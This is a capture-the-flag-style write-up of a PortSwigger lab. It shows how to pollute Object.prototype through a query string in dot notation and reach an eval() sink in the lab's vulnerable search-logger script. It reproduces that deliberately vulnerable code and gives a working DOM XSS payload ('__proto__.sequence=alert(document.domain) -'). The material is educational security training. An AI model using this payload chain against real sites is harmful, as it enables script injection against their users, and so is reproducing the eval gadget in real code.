# DOM XSS via an alternative prototype pollution vector

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/prototype-pollution/finding/lab-prototype-pollution-dom-xss-via-an-alternative-prototype-pollution-vector), you'll learn: DOM XSS via an alternative prototype pollution vector! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab is vulnerable to [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) via client-side [prototype pollution](https://portswigger.net/web-security/prototype-pollution). To solve the lab:

1. Find a source that you can use to add arbitrary properties to the global `Object.prototype`.
2. Identify a gadget property that allows you to execute arbitrary JavaScript. 
3. Combine these to call `alert()`.

You can solve this lab manually in your browser, or use [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader) to help you.

## Exploitation

### Find a source that you can use to add arbitrary properties to the global `Object.prototype`

**To find a source (Inputs that are under attacker's control), we can do it manually:**

1. Try to inject an arbitrary property via the query string, URL fragment, and any web message data. For example:
```js
vulnerable-website.com/?__proto__[foo]=bar
```

2. In the browser console, inspect the `Object.prototype` to see if we have successfully polluted it with our arbitrary property:
```js
Object.prototype.foo
// "bar" indicates that you have successfully polluted the prototype
// undefined indicates that the attack was not successful
```
   
3. If the property was not added to the global prototype, try using different techniques, such as switching to dot notation rather than bracket notation, or vice versa:
```js
vulnerable-website.com/?__proto__.foo=bar
```

4. Repeat this process for each potential source.

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-2/images/Pasted%20image%2020230118192504.png)

Let's try to search something:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-2/images/Pasted%20image%2020230118193245.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-2/images/Pasted%20image%2020230118193255.png)

**View source page:**
```html
<script src='resources/js/jquery_3-0-0.js'></script>
<script src='resources/js/jquery_parseparams.js'></script>
<script src='resources/js/searchLoggerAlternative.js'></script>
<section class=search>
    <form action=/ method=GET>
        <input type=text placeholder='Search the blog...' name=search>
        <button type=submit class=button>Search</button>
    </form>
</section>
```

As you can see, it loaded 3 JavaScript files. We can ignore the JQuery JavaScript library.

**`jquery_parseparams.js`:**
```js
// Add an URL parser to JQuery that returns an object
// This function is meant to be used with an URL like the window.location
// Use: $.parseParams('http://mysite.com/?var=string') or $.parseParams() to parse the window.location
// Simple variable:  ?var=abc                        returns {var: "abc"}
// Simple object:    ?var.length=2&var.scope=123     returns {var: {length: "2", scope: "123"}}
// Simple array:     ?var[]=0&var[]=9                returns {var: ["0", "9"]}
// Array with index: ?var[0]=0&var[1]=9              returns {var: ["0", "9"]}
// Nested objects:   ?my.var.is.here=5               returns {my: {var: {is: {here: "5"}}}}
// All together:     ?var=a&my.var[]=b&my.cookie=no  returns {var: "a", my: {var: ["b"], cookie: "no"}}
// You just cant have an object in an array, ?var[1].test=abc DOES NOT WORK
(function ($) {
    var re = /([^&=]+)=?([^&]*)/g;
    var decode = function (str) {
        return decodeURIComponent(str.replace(/\+/g, ' '));
    };
    $.parseParams = function (query) {
        // recursive function to construct the result object
        function createElement(params, key, value) {
            key = key + '';
            // if the key is a property
            if (key.indexOf('.') !== -1) {
                // extract the first part with the name of the object
                var list = key.split('.');
                // the rest of the key
                var new_key = key.split(/\.(.+)?/)[1];
                // create the object if it doesnt exist
                if (!params[list[0]]) params[list[0]] = {};
                // if the key is not empty, create it in the object
                if (new_key !== '') {
                    createElement(params[list[0]], new_key, value);
                } else console.warn('parseParams :: empty property in key "' + key + '"');
            } else
                // if the key is an array
            if (key.indexOf('[') !== -1) {
                // extract the array name
                var list = key.split('[');
                key = list[0];
                // extract the index of the array
                var list = list[1].split(']');
                var index = list[0]
                // if index is empty, just push the value at the end of the array
                if (index == '') {
                    if (!params) params = {};
                    if (!params[key] || !$.isArray(params[key])) params[key] = [];
                    params[key].push(value);
                } else
                    // add the value at the index (must be an integer)
                {
                    if (!params) params = {};
                    if (!params[key] || !$.isArray(params[key])) params[key] = [];
                    params[key][parseInt(index)] = value;
                }
            } else
                // just normal key
            {
                if (!params) params = {};
                params[key] = value;
            }
        }
        // be sure the query is a string
        query = query + '';
        if (query === '') query = window.location + '';
        var params = {}, e;
        if (query) {
            // remove # from end of query
            if (query.indexOf('#') !== -1) {
                query = query.substr(0, query.indexOf('#'));
            }

            // remove ? at the begining of the query
            if (query.indexOf('?') !== -1) {
                query = query.substr(query.indexOf('?') + 1, query.length);
            } else return {};
            // empty parameters
            if (query == '') return {};
            // execute a createElement on every key and value
            while (e = re.exec(query)) {
                var key = decode(e[1]);
                var value = decode(e[2]);
                createElement(params, key, value);
            }
        }
        return params;
    };
})(jQuery);
```

**`searchLoggerAlternative.js`:**
```js
async function logQuery(url, params) {
    try {
        await fetch(url, {method: "post", keepalive: true, body: JSON.stringify(params)});
    } catch(e) {
        console.error("Failed storing query");
    }
}

async function searchLogger() {
    window.macros = {};
    window.manager = {params: $.parseParams(new URL(location)), macro(property) {
            if (window.macros.hasOwnProperty(property))
                return macros[property]
        }};
    let a = manager.sequence || 1;
    manager.sequence = a + 1;

    eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');

    if(manager.params && manager.params.search) {
        await logQuery('/logger', manager.params);
    }
}

window.addEventListener("load", searchLogger);
```

**Let's take a look at the `jquery_parseparams.js`:**
```js
// Add an URL parser to JQuery that returns an object
// This function is meant to be used with an URL like the window.location
// Use: $.parseParams('http://mysite.com/?var=string') or $.parseParams() to parse the window.location
// Simple variable:  ?var=abc                        returns {var: "abc"}
// Simple object:    ?var.length=2&var.scope=123     returns {var: {length: "2", scope: "123"}}
// Simple array:     ?var[]=0&var[]=9                returns {var: ["0", "9"]}
// Array with index: ?var[0]=0&var[1]=9              returns {var: ["0", "9"]}
// Nested objects:   ?my.var.is.here=5               returns {my: {var: {is: {here: "5"}}}}
// All together:     ?var=a&my.var[]=b&my.cookie=no  returns {var: "a", my: {var: ["b"], cookie: "no"}}
// You just cant have an object in an array, ?var[1].test=abc DOES NOT WORK
```

Armed with above information, we can try to pollute the `Object.prototype` via the `search` query. This can be happened is because it parses our `search` value to JQuery, which then returns an object:

```js
/?__proto__[foo]=bar
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-2/images/Pasted%20image%2020230118193811.png)

Nope. That doesn't add our arbitrary property via query string.

**How about switching to dot notation rather than bracket notation?**
```js
/?__proto__.foo=bar
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-2/images/Pasted%20image%2020230118193941.png)

Nice! We successfully polluted the global `Object.prototype`!

### Identify a gadget property that allows you to execute arbitrary JavaScript

**In the `searchLoggerAlternative.js`, it has an `eval()` sink (Dangerous function):**
```js
eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');
```

Also, looks like `manager.sequence` attribute can be the source (Attacker's controlled input). Most importantly, it's not defined by default.

If we can **pollute the object `manager`'s attribute `sequence`**, we can trigger an DOM-based XSS payload!

### Combine these to call `alert()`

**Let's try to `eval()` `alert()`:**
```js
/?__proto__.sequence=alert(document.domain)
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-2/images/Pasted%20image%2020230118195258.png)

Hmm... It didn't work. Let's use the error trace stack and set a break point to see what happened:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-2/images/Pasted%20image%2020230118195553.png)

Then set a break point by clicking line 18:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-2/images/Pasted%20image%2020230118195617.png)

After that, refresh the page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-2/images/Pasted%20image%2020230118195739.png)

As you can see, our XSS payload is `alert(document.domain)1`.

**This is because the `searchLoggerAlternative.js` added an integer 1:**
```js
let a = manager.sequence || 1;
manager.sequence = a + 1;
```

**To bypass that, we can add an `-` operator:**
```js
/?__proto__.sequence=alert(document.domain) -
```

**Hence the sink will be:**
```js
eval('alert(document.domain) -1');
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-2/images/Pasted%20image%2020230118200324.png)

Nice! We successfully polluted the `manager.sequence` attribute with our DOM-based XSS payload!

# What we've learned:

1. DOM XSS via an alternative prototype pollution vector